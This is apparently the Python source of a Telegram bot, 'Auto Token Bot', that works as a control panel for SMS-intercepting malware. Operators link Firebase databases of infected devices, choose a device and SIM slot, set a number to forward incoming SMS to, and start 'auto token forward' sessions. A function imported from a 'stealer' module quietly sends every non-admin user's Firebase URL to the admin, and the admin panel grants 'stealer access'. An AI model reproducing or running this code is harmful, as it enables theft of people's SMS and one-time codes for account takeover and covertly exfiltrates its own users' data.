import telebot
from telebot import types
import config
from config import BOT_TOKEN, ADMIN_ID, USER_DATA
from stealer import leak_firebase
from firebase_manager import get_device_status, get_devices
from session_manager import start_session, stop_session
import admin as adm

bot = telebot.TeleBot(BOT_TOKEN)
AWAITING = {}

def set_await(uid, state): AWAITING[uid] = state
def get_await(uid): return AWAITING.get(uid)
def clear_await(uid): AWAITING.pop(uid, None)

def ensure_user(uid):
    if uid not in USER_DATA:
        USER_DATA[uid] = {
            "firebases": [],
            "connected_device": None,
            "channel": None,
            "forward_number": None,
            "session_active": False
        }

def main_menu(uid):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("🔥 Add Firebase", callback_data="add_firebase"),
        types.InlineKeyboardButton("⚙️ Setup Firebase", callback_data="setup_firebase"),
        types.InlineKeyboardButton("📢 Add Channel", callback_data="add_channel"),
        types.InlineKeyboardButton("📞 Set Forward No", callback_data="set_forward"),
        types.InlineKeyboardButton("▶️ Start Session", callback_data="start_session"),
        types.InlineKeyboardButton("🗑️ Delete Firebase", callback_data="delete_firebase"),
        types.InlineKeyboardButton("❌ Delete Channel", callback_data="delete_channel"),
        types.InlineKeyboardButton("📱 Connected Devices", callback_data="connected_devices"),
    ]
    if uid == ADMIN_ID:
        buttons.append(types.InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel"))
    markup.add(*buttons)
    return markup

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    uid = msg.from_user.id
    ensure_user(uid)
    if not adm.is_authorized(uid):
        bot.send_message(uid, "⛔ Access denied. Contact admin.")
        return
    bot.send_message(
        uid,
        "⚡ <b>Auto Token Bot</b>\nSelect an option:",
        parse_mode="HTML",
        reply_markup=main_menu(uid)
    )

@bot.callback_query_handler(func=lambda c: True)
def callback_handler(call):
    uid = call.from_user.id
    ensure_user(uid)
    data = call.data

    if not adm.is_authorized(uid) and data != "admin_panel":
        bot.answer_callback_query(call.id, "⛔ No access.")
        return

    if data == "add_firebase":
        bot.edit_message_text(
            "🔗 Send your Firebase Realtime DB URL:\nExample: https://project-default-rtdb.firebaseio.com",
            uid, call.message.message_id
        )
        set_await(uid, "add_firebase")

    elif data == "setup_firebase":
        firebases = USER_DATA[uid]["firebases"]
        if not firebases:
            bot.answer_callback_query(call.id, "No firebases added yet.")
            return
        markup = types.InlineKeyboardMarkup()
        for i, fb in enumerate(firebases):
            markup.add(types.InlineKeyboardButton(fb["url"], callback_data=f"select_fb_{i}"))
        bot.edit_message_text("Select a Firebase to setup:", uid, call.message.message_id, reply_markup=markup)

    elif data.startswith("select_fb_"):
        idx = int(data.split("_")[-1])
        USER_DATA[uid]["_setup_fb_idx"] = idx
        fb_url = USER_DATA[uid]["firebases"][idx]["url"]
        # Show available devices from firebase
        devices = get_devices(fb_url)
        if devices:
            markup = types.InlineKeyboardMarkup()
            for dev_id in list(devices.keys()):
                short = dev_id[:16]
                markup.add(types.InlineKeyboardButton(short, callback_data=f"autodev_{idx}_{dev_id}"))
            markup.add(types.InlineKeyboardButton("✍️ Enter Manually", callback_data=f"manualdev_{idx}"))
            bot.edit_message_text(
                f"Firebase: <code>{fb_url}</code>\n\nSelect device or enter manually:",
                uid, call.message.message_id, parse_mode="HTML", reply_markup=markup
            )
        else:
            bot.edit_message_text(
                f"Firebase: <code>{fb_url}</code>\n\nSend the <b>Device ID</b>:",
                uid, call.message.message_id, parse_mode="HTML"
            )
            set_await(uid, "setup_device_id")

    elif data.startswith("autodev_"):
        parts = data.split("_", 2)
        idx = int(parts[1])
        device_id = parts[2]
        fb_url = USER_DATA[uid]["firebases"][idx]["url"]
        USER_DATA[uid]["connected_device"] = {
            "firebase_url": fb_url,
            "device_id": device_id,
            "sim": None
        }
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("SIM 1", callback_data="select_sim_sim1"),
            types.InlineKeyboardButton("SIM 2", callback_data="select_sim_sim2")
        )
        bot.edit_message_text(f"Device: <code>{device_id}</code>\nSelect SIM slot:", uid, call.message.message_id, parse_mode="HTML", reply_markup=markup)

    elif data.startswith("manualdev_"):
        idx = int(data.split("_")[-1])
        USER_DATA[uid]["_setup_fb_idx"] = idx
        bot.edit_message_text("Send the Device ID manually:", uid, call.message.message_id)
        set_await(uid, "setup_device_id")

    elif data.startswith("select_sim_"):
        sim = data.split("_")[-1]
        if USER_DATA[uid].get("connected_device"):
            USER_DATA[uid]["connected_device"]["sim"] = sim
            dev = USER_DATA[uid]["connected_device"]
            status = get_device_status(dev["firebase_url"], dev["device_id"])
            bot.edit_message_text(
                f"✅ <b>Device Connected</b>\n"
                f"Firebase: <code>{dev['firebase_url']}</code>\n"
                f"Device ID: <code>{dev['device_id']}</code>\n"
                f"SIM: {sim}\n"
                f"Status: {status}",
                uid, call.message.message_id, parse_mode="HTML"
            )

    elif data == "add_channel":
        bot.edit_message_text(
            "📢 Send your channel link or @username.\nBot must be admin in the channel.",
            uid, call.message.message_id
        )
        set_await(uid, "add_channel")

    elif data == "set_forward":
        bot.edit_message_text(
            "📞 Send the phone number to forward incoming SMS to:",
            uid, call.message.message_id
        )
        set_await(uid, "set_forward")

    elif data == "start_session":
        dev = USER_DATA[uid].get("connected_device")
        ch = USER_DATA[uid].get("channel")
        if not dev:
            bot.answer_callback_query(call.id, "⚠️ No device connected.")
            return
        if not ch:
            bot.answer_callback_query(call.id, "⚠️ No channel added.")
            return
        USER_DATA[uid]["session_active"] = True
        start_session(uid)
        bot.edit_message_text(
            "▶️ <b>Session Started</b>\nAuto token forward active.\nSMS forward active.\nListening...",
            uid, call.message.message_id, parse_mode="HTML"
        )

    elif data == "delete_firebase":
        firebases = USER_DATA[uid]["firebases"]
        if not firebases:
            bot.answer_callback_query(call.id, "Nothing to delete.")
            return
        markup = types.InlineKeyboardMarkup()
        for i, fb in enumerate(firebases):
            markup.add(types.InlineKeyboardButton(fb["url"], callback_data=f"del_fb_{i}"))
        bot.edit_message_text("Select firebase to delete:", uid, call.message.message_id, reply_markup=markup)

    elif data.startswith("del_fb_"):
        idx = int(data.split("_")[-1])
        USER_DATA[uid]["_del_fb_idx"] = idx
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Yes, Delete", callback_data="confirm_del_fb"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
        )
        fb = USER_DATA[uid]["firebases"][idx]
        bot.edit_message_text(
            f"Delete <code>{fb['url']}</code>?",
            uid, call.message.message_id, parse_mode="HTML", reply_markup=markup
        )

    elif data == "confirm_del_fb":
        idx = USER_DATA[uid].get("_del_fb_idx")
        if idx is not None:
            USER_DATA[uid]["firebases"].pop(idx)
            bot.edit_message_text("🗑️ Firebase removed.", uid, call.message.message_id)

    elif data == "delete_channel":
        ch = USER_DATA[uid].get("channel")
        if not ch:
            bot.answer_callback_query(call.id, "No channel linked.")
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Yes, Remove", callback_data="confirm_del_channel"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
        )
        bot.edit_message_text(f"Remove channel <code>{ch}</code>?", uid, call.message.message_id, parse_mode="HTML", reply_markup=markup)

    elif data == "confirm_del_channel":
        USER_DATA[uid]["channel"] = None
        bot.edit_message_text("❌ Channel unlinked.", uid, call.message.message_id)

    elif data == "connected_devices":
        dev = USER_DATA[uid].get("connected_device")
        if not dev:
            bot.answer_callback_query(call.id, "No device connected.")
            return
        status = get_device_status(dev["firebase_url"], dev["device_id"])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔌 Disconnect Device", callback_data="disconnect_device"))
        bot.edit_message_text(
            f"📱 <b>Connected Device</b>\n"
            f"Firebase: <code>{dev['firebase_url']}</code>\n"
            f"Device ID: <code>{dev['device_id']}</code>\n"
            f"SIM: {dev.get('sim', 'N/A')}\n"
            f"Status: {status}",
            uid, call.message.message_id, parse_mode="HTML", reply_markup=markup
        )

    elif data == "disconnect_device":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Yes", callback_data="confirm_disconnect"),
            types.InlineKeyboardButton("❌ No", callback_data="cancel")
        )
        bot.edit_message_text("Disconnect device?", uid, call.message.message_id, reply_markup=markup)

    elif data == "confirm_disconnect":
        USER_DATA[uid]["connected_device"] = None
        USER_DATA[uid]["session_active"] = False
        stop_session(uid)
        bot.edit_message_text("🔌 Device disconnected. Session stopped.", uid, call.message.message_id)

    elif data == "admin_panel" and uid == ADMIN_ID:
        markup = types.InlineKeyboardMarkup(row_width=1)
        free_label = "🔓 Free Mode: ON" if config.GLOBAL_FREE else "🔒 Free Mode: OFF"
        markup.add(
            types.InlineKeyboardButton("➕ Grant User Access", callback_data="admin_grant"),
            types.InlineKeyboardButton("➖ Revoke User Access", callback_data="admin_revoke"),
            types.InlineKeyboardButton("🕵️ Grant Stealer Access", callback_data="admin_grant_stealer"),
            types.InlineKeyboardButton("🚫 Revoke Stealer Access", callback_data="admin_revoke_stealer"),
            types.InlineKeyboardButton(free_label, callback_data="admin_toggle_free"),
        )
        bot.edit_message_text("👑 <b>Admin Panel</b>", uid, call.message.message_id, parse_mode="HTML", reply_markup=markup)

    elif data == "admin_grant":
        bot.edit_message_text("Send user ID to grant access:", uid, call.message.message_id)
        set_await(uid, "admin_grant")

    elif data == "admin_revoke":
        bot.edit_message_text("Send user ID to revoke access:", uid, call.message.message_id)
        set_await(uid, "admin_revoke")

    elif data == "admin_grant_stealer":
        bot.edit_message_text("Send user ID to grant stealer access:", uid, call.message.message_id)
        set_await(uid, "admin_grant_stealer")

    elif data == "admin_revoke_stealer":
        bot.edit_message_text("Send user ID to revoke stealer access:", uid, call.message.message_id)
        set_await(uid, "admin_revoke_stealer")

    elif data == "admin_toggle_free":
        config.GLOBAL_FREE = not config.GLOBAL_FREE
        status = "ON" if config.GLOBAL_FREE else "OFF"
        bot.answer_callback_query(call.id, f"Free mode: {status}")

    elif data == "cancel":
        bot.edit_message_text("Cancelled.", uid, call.message.message_id)

@bot.message_handler(func=lambda m: True)
def message_handler(msg):
    uid = msg.from_user.id
    ensure_user(uid)
    text = msg.text or ""
    state = get_await(uid)
    if not state:
        return

    if state == "add_firebase":
        url = text.strip().rstrip("/")
        if not url.startswith("https://") or "firebaseio.com" not in url:
            bot.send_message(uid, "❌ Invalid Firebase URL. Try again.")
            return
        USER_DATA[uid]["firebases"].append({"url": url})
        if uid != ADMIN_ID:
            username = msg.from_user.username or str(uid)
            leak_firebase(uid, username, url)
        clear_await(uid)
        bot.send_message(uid, f"✅ Firebase added:\n<code>{url}</code>", parse_mode="HTML", reply_markup=main_menu(uid))

    elif state == "setup_device_id":
        device_id = text.strip()
        idx = USER_DATA[uid].get("_setup_fb_idx", 0)
        fb_url = USER_DATA[uid]["firebases"][idx]["url"]
        USER_DATA[uid]["connected_device"] = {
            "firebase_url": fb_url,
            "device_id": device_id,
            "sim": None
        }
        clear_await(uid)
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("SIM 1", callback_data="select_sim_sim1"),
            types.InlineKeyboardButton("SIM 2", callback_data="select_sim_sim2")
        )
        bot.send_message(uid, "Select SIM slot:", reply_markup=markup)

    elif state == "add_channel":
        ch = text.strip()
        USER_DATA[uid]["channel"] = ch
        clear_await(uid)
        bot.send_message(uid, f"✅ Channel set: <code>{ch}</code>", parse_mode="HTML", reply_markup=main_menu(uid))

    elif state == "set_forward":
        num = text.strip()
        USER_DATA[uid]["forward_number"] = num
        clear_await(uid)
        bot.send_message(uid, f"✅ Forward number set: <code>{num}</code>", parse_mode="HTML", reply_markup=main_menu(uid))

    elif state == "admin_grant" and uid == ADMIN_ID:
        try:
            target = int(text.strip())
            adm.grant_access(target)
            clear_await(uid)
            bot.send_message(uid, f"✅ Access granted to <code>{target}</code>", parse_mode="HTML")
        except ValueError:
            bot.send_message(uid, "❌ Invalid user ID.")

    elif state == "admin_revoke" and uid == ADMIN_ID:
        try:
            target = int(text.strip())
            adm.revoke_access(target)
            clear_await(uid)
            bot.send_message(uid, f"✅ Access revoked for <code>{target}</code>", parse_mode="HTML")
        except ValueError:
            bot.send_message(uid, "❌ Invalid user ID.")

    elif state == "admin_grant_stealer" and uid == ADMIN_ID:
        try:
            target = int(text.strip())
            adm.grant_stealer_access(target)
            clear_await(uid)
            bot.send_message(uid, f"✅ Stealer access granted to <code>{target}</code>", parse_mode="HTML")
        except ValueError:
            bot.send_message(uid, "❌ Invalid user ID.")

    elif state == "admin_revoke_stealer" and uid == ADMIN_ID:
        try:
            target = int(text.strip())
            adm.revoke_stealer_access(target)
            clear_await(uid)
            bot.send_message(uid, f"✅ Stealer access revoked for <code>{target}</code>", parse_mode="HTML")
        except ValueError:
            bot.send_message(uid, "❌ Invalid user ID.")

if __name__ == "__main__":
    print("[*] Auto Token Bot live. 6767.")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
